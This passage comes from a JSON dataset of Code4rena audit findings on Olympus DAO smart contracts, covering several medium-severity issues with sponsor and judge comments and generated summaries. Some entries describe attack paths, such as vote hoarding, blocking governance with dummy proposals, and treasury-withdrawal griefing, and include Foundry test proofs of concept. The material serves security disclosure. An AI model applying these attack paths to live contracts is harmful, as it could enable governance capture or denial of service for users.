block.timestamp - 3 * uint256(observationFrequency))\n\nlike line 165.\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/391#issuecomment-1238515996):**\n > This should indeed be the same. We will update to fix.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an inconsistency in the staleness checks of the Price oracle in the `getCurrentPrice()` function of `PRICE.sol` in the code-423n4/2022-08-olympus repository. This inconsistency may lead to the `getCurrentPrice()` reverting, which could have an impact on the entire system. \n\nThe inconsistency was identified by manual review and talking with developers. The proof of concept is that, for OHM, the `updatedAt` should be lower than the current timestamp minus three times the observation frequency, while for the reserve price, it is required that the `updatedAt` should be lower than the current timestamp minus the observation frequency. This means that the frequency of new price information might be lower than the observation frequency, which is probably the case. \n\nThe recommended mitigation step is to change the line 171 to match line 165. This should solve the inconsistency and ensure that the `getCurrentPrice()` function does not revert.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/391",
      "tags": [
        "Stale Price"
      ],
      "finders": [
        "okkothejawa",
        "reassor",
        "datapunk",
        "Trust"
      ]
    },
    {
      "id": "3221",
      "title": "[M-17] No Cap on Amount of VOTES means the `voter_admin` can get any proposal to pass",
      "impact": "MEDIUM",
      "content": "_Submitted by GalloDaSballo, also found by 0xNazgul, IllIllI, and rbserver_\n\nBecause `VOTES` can be minted by `voter_admin`, and there is no cap on totalSupply, the `voter_admin` has the privileged ability to mint as many `VOTES` as they want in order to get any proposal to pass or veto it.\n\n### Proof of Concept - Veto\n\n*   Be `voter_admin`\n*   Mint XYZ tokens\n*   totalSupply is now higher so any proposal can be [vetoed per this line](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L268-L269)\n\n### Proof of Concept - Approve\n\n*   Be `voter_admin`\n*   Mint XYZ tokens, where XYZ allows the `netVotes * 100 < VOTES.totalSupply() * EXECUTION_THRESHOLD` check to pass\n*   Mint `VOTES` to self\n*   Vote\n*   Proposal has passed\n\n### Recommended Mitigation Steps\n\nAdd a total supply cap to `VOTES`.\n\n**[fullyallocated (Olympus) disputed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1236240959):**\n > This is possible but will not happen in a production environment because we're using this for internal testing.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/380#issuecomment-1251636550):**\n > Given the scope of the contracts the wardens were asked to review, I think this issue is valid. While I understand that the `voter_admin` is trusted, I don't think users expect the admin to be able to bypass any votes results in this manner. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Governance.sol code of the 2022-08-olympus project. This vulnerability allows the voter_admin to mint an unlimited amount of VOTES tokens, which can be used to veto or approve any proposal. This is demonstrated in the Proof of Concept (POC) section, where it is shown how the voter_admin can mint tokens to veto a proposal or to approve a proposal. The recommended remediation step is to add a total supply cap to the VOTES tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/380",
      "tags": [],
      "finders": [
        "IllIllI",
        "0xNazgul",
        "GalloDaSballo",
        "rbserver"
      ]
    },
    {
      "id": "3220",
      "title": "[M-16] Inconsistant parameter requirements between `constructor()` and `Set() functions` in `RANGE.sol` and `Operator.sol`.",
      "impact": "MEDIUM",
      "content": "_Submitted by hansfriese, also found by datapunk and itsmeSTYJ_\n\nInconsistant parameter requirements between `constructor` and `Set() functions` in `RANGE.sol` and `Operator.sol`.\n\nThe contracts might work unexpectedly when the params are set improperly using `constructor()`.\n\n### Proof of Concept\n\n*   In `RANGE.sol`, [setSpreads()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250) and [setThresholdFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264) has some requirements but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80) doesn't check at all.\n\n```\n    File: 2022-08-olympus\\src\\modules\\RANGE.sol\n    242:     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n    243:         // Confirm spreads are within allowed values\n    244:         if (\n    245:             wallSpread_ > 10000 ||\n    246:             wallSpread_ < 100 ||\n    247:             cushionSpread_ > 10000 ||\n    248:             cushionSpread_ < 100 ||\n    249:             cushionSpread_ > wallSpread_\n    250:         ) revert RANGE_InvalidParams();\n    251: \n    252:         // Set spreads\n    253:         _range.wall.spread = wallSpread_;\n    254:         _range.cushion.spread = cushionSpread_;\n    255: \n    256:         emit SpreadsChanged(wallSpread_, cushionSpread_);\n    257:     }\n```\n```\n\n    File: 2022-08-olympus\\src\\modules\\RANGE.sol\n    263:     function setThresholdFactor(uint256 thresholdFactor_) external permissioned {\n    264:         if (thresholdFactor_ > 10000 || thresholdFactor_ < 100) revert RANGE_InvalidParams();\n    265:         thresholdFactor = thresholdFactor_;\n    266: \n    267:         emit ThresholdFactorChanged(thresholdFactor_);\n    268:     }\n    269: \n```\n\n*   In `Operator.sol`, [setCushionFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L518) checks the requirement but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L134) doesn't check it.\n\n```\n\n    File: 2022-08-olympus\\src\\policies\\Operator.sol\n    516:     function setCushionFactor(uint32 cushionFactor_) external onlyRole(\"operator_policy\") {\n    517:         /// Confirm factor is within allowed values\n    518:         if (cushionFactor_ > 10000 || cushionFactor_ < 100) revert Operator_InvalidParams();\n    519: \n    520:         /// Set factor\n    521:         _config.cushionFactor = cushionFactor_;\n    522: \n    523:         emit CushionFactorChanged(cushionFactor_);\n    524:     }\n    525: \n```\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nRecommend adding same validation for the parameters between `constructor()` and `Set()` functions.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1238786025):**\n > Agree that the constructor should validate these parameters, but it is only an issue if configured improperly. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/379#issuecomment-1251087775):**\n > While I am typically weary of marking input validations as medium severity, I do think in this case it's warranted as it directly leads to malfunctions at the protocol level and it seems that the sponsors thought it important enough to add the checks elsewhere. Hard call, but will award it at medium severity.   \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about inconsistent parameter requirements between `constructor` and `Set() functions` in `RANGE.sol` and `Operator.sol` contracts. This could lead to unexpected results when the parameters are set improperly using `constructor()`.\n\nThe proof of concept for this bug report was done using Solidity Visual Developer of VSCode. In `RANGE.sol`, the [setSpreads()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L244-L250) and [setThresholdFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L264) functions have some requirements but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/RANGE.sol#L80) does not check at all. Similarly, in `Operator.sol`, the [setCushionFactor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L518) function checks the requirement but [constructor()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Operator.sol#L134) does not.\n\nThe recommended mitigation step for this bug is to add the same validation for the parameters between `constructor()` and `Set()` functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/379",
      "tags": [],
      "finders": [
        "datapunk  itsmeSTYJ",
        "hansfriese"
      ]
    },
    {
      "id": "3219",
      "title": "[M-15] Heart will stop if all rewards are swept",
      "impact": "MEDIUM",
      "content": "_Submitted by GalloDaSballo, also found by cccz, itsmeSTYJ, and PwnPatrol_\n\nRewards for Heart `beat` are sent via `_issueReward`\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L110-L115>\n\n```solidity\n\n    function _issueReward(address to_) internal {\n        rewardToken.safeTransfer(to_, reward);\n        emit RewardIssued(to_, reward);\n    }\n\n```\n\nThe function doesn't check for available tokens e.g.<br>\n`min(reward, rewardToken.balanceOf(address(this)));`\n\nIn case of calling `withdrawUnspentRewards`\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L149-L152>\n\n```solidity\n    /// @inheritdoc IHeart\n    function withdrawUnspentRewards(ERC20 token_) external onlyRole(\"heart_admin\") {\n        token_.safeTransfer(msg.sender, token_.balanceOf(address(this)));\n    }\n```\n\nBecause the function withdraws the entire amount, the heart will stop until a caller incentive is deposited again.\n\nWhile a profitable searches will stop calling the Heart without an incentive, allowing the heart to beat when no rewards are available is preferable to having it self-DOS until a DAO aligned caller donates `rewardToken` or the DAO deals with the lack of tokens.\n\n### Recommended Mitigation Steps\n\nAdd a check for available tokens\n`min(reward, rewardToken.balanceOf(address(this)));`\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/378#issuecomment-1239855093):**\n > Agree based on the anti-DOS characteristics of using a min operation.\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns the code in the Heart.sol smart contract, which is part of the 2022-08-olympus repository on GitHub. The bug is that the contract does not check for available tokens when sending rewards via the _issueReward function. This could lead to a situation where the Heart stops beating until a caller incentive is deposited again. This could cause a self-DOS situation, which is not desirable.\n\nThe recommended remediation is to add a check for available tokens to the _issueReward function, using the min function to ensure the amount of tokens sent does not exceed the amount of tokens available. This would prevent the Heart from stopping until a caller incentive is deposited.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/378",
      "tags": [],
      "finders": [
        "cccz",
        "itsmeSTYJ",
        "GalloDaSballo",
        "PwnPatrol"
      ]
    },
    {
      "id": "3218",
      "title": "[M-14] The governance system can be held hostage by a malicious user",
      "impact": "MEDIUM",
      "content": "_Submitted by d3e4, also found by Aymen0909 and pedroais_\n\nWith only [`ENDORSEMENT_THRESHOLD`](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L130)% (currently 20%) voting power, a malicious user can prevent any other proposal from being activated.\nWhile `ENDORSEMENT_THRESHOLD` is currently fairly high, it seems not higher than that it might not be used to hold the system hostage to extract far more funds.\n\n### Proof of Concept\n\n[Submit](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L159) a dummy proposal, [endorse](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L180) it and then [activate](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L205) it. Now, no other proposal can be activated for a [`GRACE_PERIOD`](https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L127). When this time period is over, this procedure may be repeated, either immediately or just before any other proposal activation by front-running.\n\n### Recommended Mitigation Steps\n\nMaking sure `ENDORSEMENT_THRESHOLD` is at least 50% seems discouraging enough. Other more creative solutions should be possible. One might be to let the most endorsed proposal be activated, or restricting who can activate a proposal; anything that at least temporarily liberates the governance system so that the attacker is dissuaded from investing in this attack method.\n\n**[fullyallocated (Olympus) acknowledged](https://github.com/code-423n4/2022-08-olympus-findings/issues/375)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that allows a malicious user to prevent any other proposal from being activated in the governance system of the code-423n4/2022-08-olympus project. With only 20% voting power, an attacker can submit a dummy proposal, endorse it and then activate it. This will prevent any other proposal from being activated for a certain grace period. To mitigate this vulnerability, the code-423n4/2022-08-olympus project recommends increasing the ENDORSEMENT_THRESHOLD to at least 50%. Other more creative solutions should also be explored, such as letting the most endorsed proposal be activated, or restricting who can activate a proposal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/375",
      "tags": [],
      "finders": [
        "Aymen0909  pedroais",
        "d3e4"
      ]
    },
    {
      "id": "3217",
      "title": "[M-13] Missing checks in `Kernel._deactivatePolicy`",
      "impact": "MEDIUM",
      "content": "_Submitted by enckrish_\n\nThere are no checks to ascertain that the policy being removed is registered in the `Kernel`. Trying to remove a non-registered results in the policy registered at 0th index of `activePolicies` being removed.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325>\n\n### Recommended Mitigation Steps\n\nAdding `require(activePolicies[idx] == policy_, \"Unregistered policy\");` will prevent this, where `idx = getPolicyIndex[policy_]`.\n\n**NOTE:** The issue is less likely to happen as this is handled solely by the executor, but having safeguards in the contract is always better than relying on an external factor.\n\n**[ind-igo (Olympus) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1241160679):**\n > Confirmed. Should be lower risk or a QA issue.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1251627251):**\n > @ind-igo - can you comment on why you think it should be QA vs Medium?\n> \n> `\n>  — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> I would expect this to impact the functionality of the protocol. \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255251454):**\n > This one seems on the fence to me. While accidentally unregistering a policy likely would affect the functionality of the protocol, it requires the executor to make a mistake. If the mistake is made, it's easily remedied by re-registering the policy.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/368#issuecomment-1255293207):**\n > That makes sense, but there would be some amount of down time when this occurred. I think Medium is correct for this issue. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the Kernel smart contract. The vulnerability is that there are no checks to ascertain that the policy being removed is registered in the Kernel. This means that if an unregistered policy is removed, the policy registered at 0th index of activePolicies will be removed. To demonstrate the vulnerability, the code can be seen at https://github.com/code-423n4/2022-08-olympus/blob/main/src/Kernel.sol#L325. The recommended mitigation step is to add a require statement to the code that will check if the policy is registered before it is removed. This will prevent the policy registered at 0th index of activePolicies from being removed. Although the issue is less likely to happen as it is handled by the executor, it is still recommended that the code is updated with the require statement for added security.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/368",
      "tags": [],
      "finders": [
        "enckrish"
      ]
    },
    {
      "id": "3216",
      "title": "[M-12] Griefing/DOS of withdrawals by EOAs from treasury (TRSRY) possible",
      "impact": "MEDIUM",
      "content": "_Submitted by minhtrng_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L53-L67><br>\n\nAny withdrawals from the treasury by an approved EOA can be denied by a malicious actor that watches the mempool.\n\n### Proof of Concept\n\nThe function TreasuryCustodian.revokePolicyApprovals() doesnt provide sufficient checks for its intended purpose of \"revoking a deactivated policy's approvals\". As can be seen by the TODO labels, the issue has already been acknowledged by the team (regardless it is still an issue present in an in-scope contract). The only check performed is trying to call the isActive()-function on an address and interpret the returned value as boolean. Attempting to call this function on an EOA will not fail and return 0 (=false). Hence the condition to revert is not fulfilled and the amounts approved to withdraw will be set to 0.\n\n### Tools Used\n\nIDE (Remix, VSCode)\n\n### Recommended Mitigation Steps\n\nA partial but insufficient fix would be to check if the address passed to the function contains code and hence is not an EOA. A better approach might be to add a mapping(address => bool) of all addresses that have been active policies some time in the past to the kernel, something like this:\n\nAs a public variable in Kernel.sol\n`mapping(address => bool) public isRegisteredPolicy;`\n\nin Kernel.activatePolicy():\n`isRegisteredPolicy[address(policy_)] ) = true;`\n\nand finally in TreasuryCustodian.revokePolicyApprovals():\n`if(!kernel.isRegisteredPolicy(policy_) revert NotARegisteredPolicy`\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/317#issuecomment-1241262776):**\n > TODOs are outdated, I forgot to clear them ;(. But the points are taken. Code will be adjusted, but probably not the way from the recommendation. Instead will gate the function behind custodian role.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the TreasuryCustodian.sol contract that allows malicious actors to deny withdrawals from the treasury by an approved EOA. The function TreasuryCustodian.revokePolicyApprovals() doesn't provide enough checks for its intended purpose, and the only check it performs is trying to call the isActive()-function on an address and interpret the returned value as boolean. As the function does not fail when called on an EOA, the condition to revert is not fulfilled and the amounts approved to withdraw are set to 0. The tools used to identify this vulnerability were an IDE (Remix, VSCode).\n\nThe recommended mitigation steps for this vulnerability include partially checking if the address passed to the function contains code and is not an EOA, and adding a mapping (address => bool) of all addresses that have been active policies some time in the past to the kernel, with a public variable, isRegisteredPolicy, in the Kernel.sol contract. This variable should be set to true in the Kernel.activatePolicy() function, and the TreasuryCustodian.revokePolicyApprovals() function should revert if the address is not a registered policy.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/317",
      "tags": [],
      "finders": [
        "minhtrng"
      ]
    },
    {
      "id": "3215",
      "title": "[M-11] OlympusGovernance: Users can prevent their votes from being revoked",
      "impact": "MEDIUM",
      "content": "_Submitted by cccz, also found by zzzitron_\n\nIn the VoterRegistration contract, voter_admin can call the revokeVotesFrom function to revoke the user's votes.\n\n        function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n            // Revoke the votes in the VOTES module\n            VOTES.burnFrom(wallet_, amount_);\n        }\n\nBut there is a way for users to prevent their votes from being revoked by voter_admin.<br>\nIn the OlympusGovernance contract, the user can call the vote function to vote for the activeProposal, and then call the reclaimVotes function to reclaim his votes.<br>\nWhen the vote function is called, VOTES are sent to the OlympusGovernance contract and recorded using the userVotesForProposal variable. When the reclaimVotes function is called, the VOTES recorded in the userVotesForProposal variable are sent back to the user.<br>\nThis means that the user can **store** his VOTES tokens in userVotesForProposal.<br>\nThe revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal and the reclaimVotes function can only be called by the user himself.<br>\nIf the user calls the reclaimVotes function and vote function in one transaction, then his VOTES token balance will always be 0 (thus avoiding revocation of votes by voter_admin) and he will be able to vote.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L240-L262><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L295-L313><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/VoterRegistration.sol#L53-L56>\n\n### Recommended Mitigation Steps\n\nConsider allowing to call the reclaimVotes function to reclaim any user's vote, thus avoiding the user storing his VOTES tokens in userVotesForProposal\n\n        function reclaimVotes(uint256 proposalId_, address user_) external {\n            uint256 userVotes = userVotesForProposal[proposalId_][user_];\n\n            if (userVotes == 0) {\n                revert CannotReclaimZeroVotes();\n            }\n\n            if (proposalId_ == activeProposal.proposalId) {\n                revert CannotReclaimTokensForActiveVote();\n            }\n\n            if (tokenClaimsForProposal[proposalId_][user_] == true) {\n                revert VotingTokensAlreadyReclaimed();\n            }\n\n            tokenClaimsForProposal[proposalId_][user_] = true;\n\n            VOTES.transferFrom(address(this), user_, userVotes);\n        }\n\n**[fullyallocated (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1234876428):**\n > This is true, we don't expect to use the voter admin in production, just to issue votes during internal testing period.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1252360367):**\n > Downgrading to M severity as this does not lead to direct loss of user funds, but does highlight an issue with current contracts. \n\n**[cccz (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255045809):**\n > Consider the following scenarios.\n> There are currently three users, A, B and C, in the system.\n> 1. voter_admin minted 100 VOTEs for each of these three users\n> 2. After a period of time, due to system upgrade or other reasons, the VOTEs of the users need to be revoked.\n> 3. voter_admin revokes the VOTEs of users A and B respectively, but user C uses this vulnerability to prevent his VOTE from being revoked.\n> 4. At this time, user C has all the VOTEs, and he can execute any proposal.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255056253):**\n > Okay, at this point I still believe a Medium issue, voter_admin as a mitigation could reissue votes to User A and B. Additionally User C will eventually have to reclaim these votes in order to vote on the next proposal.  I am going to stick with Medium on this one. Appreciate the additional clarity. \n\n**[cccz (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/308#issuecomment-1255062224):**\n > @0xean - You are right, thanks for your attention.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is regarding the VoterRegistration contract, specifically the revokeVotesFrom function, which allows voter_admin to revoke the user's votes. However, there is a way for users to prevent their votes from being revoked by voter_admin. In the OlympusGovernance contract, the user can call the vote and reclaimVotes functions in one transaction. This allows the user to store their VOTES tokens in userVotesForProposal, and the revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal. \n\nThe impact of this vulnerability is that the user can store their VOTES tokens in userVotesForProposal, and the revokeVotesFrom function cannot revoke the VOTES tokens recorded in userVotesForProposal. The proof of concept is provided in the github link and no tools were used. \n\nThe recommended mitigation step for this vulnerability is to consider allowing to call the reclaimVotes function to reclaim any user's vote, thus avoiding the user storing his VOTOS tokens in userVotesForProposal.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/308",
      "tags": [],
      "finders": [
        "cccz",
        "zzzitron"
      ]
    },
    {
      "id": "3214",
      "title": "[M-10] Voted votes cannot change after the user is issued new votes or the user's old votes are revoked during voting",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver, also found by &#95;&#95;141345&#95;&#95;, cccz, csanuragjain, GalloDaSballo, Guardian, Lambda, m9800, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56><br>\n\nA user can call the following `vote` function to vote for a proposal. During voting, the voter admin can still call the `issueVotesTo` and `revokeVotesFrom` functions below to issue new votes or revoke old votes for the user, which also changes the votes' total supply during the overall voting. Because each user can only call `vote` once for a proposal due to the `userVotesForProposal[activeProposal.proposalId][msg.sender] > 0` conditional check, the old voted votes, resulted from the `vote` call by the user, will be used to compare against the new total supply of the votes, resulted from the `issueVotesTo` and `revokeVotesFrom` calls during the overall voting, when determining whether the proposal can be executed or not. Because of this inconsistency, the result on whether the proposal can be executed might not be reliable.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L240-L262>\n\n```solidity\n    function vote(bool for_) external {\n        uint256 userVotes = VOTES.balanceOf(msg.sender);\n\n        if (activeProposal.proposalId == 0) {\n            revert NoActiveProposalDetected();\n        }\n\n        if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {\n            revert UserAlreadyVoted();\n        }\n\n        if (for_) {\n            yesVotesForProposal[activeProposal.proposalId] += userVotes;\n        } else {\n            noVotesForProposal[activeProposal.proposalId] += userVotes;\n        }\n\n        userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;\n\n        VOTES.transferFrom(msg.sender, address(this), userVotes);\n\n        emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L45-L48>\n\n```solidity\n    function issueVotesTo(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Issue the votes in the VOTES module\n        VOTES.mintTo(wallet_, amount_);\n    }\n```\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/VoterRegistration.sol#L53-L56>\n\n```solidity\n    function revokeVotesFrom(address wallet_, uint256 amount_) external onlyRole(\"voter_admin\") {\n        // Revoke the votes in the VOTES module\n        VOTES.burnFrom(wallet_, amount_);\n    }\n```\n\n### Proof of Concept\n\nPlease add the following code in `src\\test\\policies\\Governance.t.sol`.\n\nFirst, please add the following code for `stdError`.\n\n```solidity\nimport {Test, stdError} from \"forge-std/Test.sol\";    // @audit import stdError for testing purpose\n```\n\nThen, please append the following tests. These tests will pass to demonstrate the described scenarios.\n\n```solidity\n    function testScenario_UserCannotVoteAgainWithNewlyMintedVotes() public {\n        _createActiveProposal();\n\n        // voter3 votes for the proposal\n        vm.prank(voter3);\n        governance.vote(true);\n\n        assertEq(governance.yesVotesForProposal(1), 300);\n        assertEq(governance.noVotesForProposal(1), 0);\n\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n\n        // to simulate calling VoterRegistration.issueVotesTo that mints votes to voter3, VOTES.mintTo is called by godmode here\n        vm.prank(godmode);\n        VOTES.mintTo(voter3, 500);\n        assertEq(VOTES.balanceOf(voter3), 500);\n\n        // calling vote function again by voter3 reverts, which means that voter3 cannot additionally vote with the 500 newly minted votes\n        vm.expectRevert(UserAlreadyVoted.selector);\n        vm.prank(voter3);\n        governance.vote(true);\n    }\n```\n\n```solidity\n    function testScenario_RevokeVotesAfterUserFinishsOwnVoting() public {\n        _createActiveProposal();\n\n        // voter3 votes for the proposal\n        vm.prank(voter3);\n        governance.vote(true);\n\n        assertEq(governance.yesVotesForProposal(1), 300);\n        assertEq(governance.noVotesForProposal(1), 0);\n\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n\n        // To simulate calling VoterRegistration.revokeVotesFrom that burns voter3's votes, VOTES.burnFrom is called by godmode here.\n        // However, calling VOTES.burnFrom will revert due to arithmetic underflow.\n        vm.prank(godmode);\n        vm.expectRevert(stdError.arithmeticError);\n        VOTES.burnFrom(voter3, 300);\n\n        // the proposal is still voted with voter3's previous votes afterwards\n        assertEq(governance.userVotesForProposal(1, voter3), 300);\n        assertEq(VOTES.balanceOf(voter3), 0);\n        assertEq(VOTES.balanceOf(address(governance)), 300);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen `issueVotesTo` and `revokeVotesFrom` are called during voting, the corresponding votes need to be added to or removed from the proposal's voted votes for the user. Alternatively, `issueVotesTo` and `revokeVotesFrom` can be disabled when an active proposal exists.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/275#issuecomment-1236238446):**\n > This is the best written answer. \n>\n > Originally votes were locked so that users cannot constantly change their vote to manipulate the outcome but the warden makes a good point about how the quorum thresholds can be changed and the affects on how consensus is calculated.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the inconsistency that exists in the vote function of the Governance.sol file in the code-423n4/2022-08-olympus repository on GitHub. The vote function allows a user to cast a vote for a proposal. During the voting process, the voter admin can still call the issueVotesTo and revokeVotesFrom functions to issue new votes or revoke old votes for the user, which also changes the total supply of votes during the overall voting. \n\nThe inconsistency lies in the fact that each user can only call vote once for a proposal due to the userVotesForProposal[activeProposal.proposalId][msg.sender] > 0 conditional check. This means that the old voted votes, resulting from the vote call by the user, will be used to compare against the new total supply of votes, resulting from the issueVotesTo and revokeVotesFrom calls during the overall voting, when determining whether the proposal can be executed or not. This inconsistency can lead to unreliable results on whether the proposal can be executed or not.\n\nThe Proof of Concept section provides code for the stdError and tests to demonstrate the described scenarios. The Tools Used section mentions VSCode as the tool used.\n\nThe Recommended Mitigation Steps suggest that when issueVotesTo and revokeVotesFrom are called during voting, the 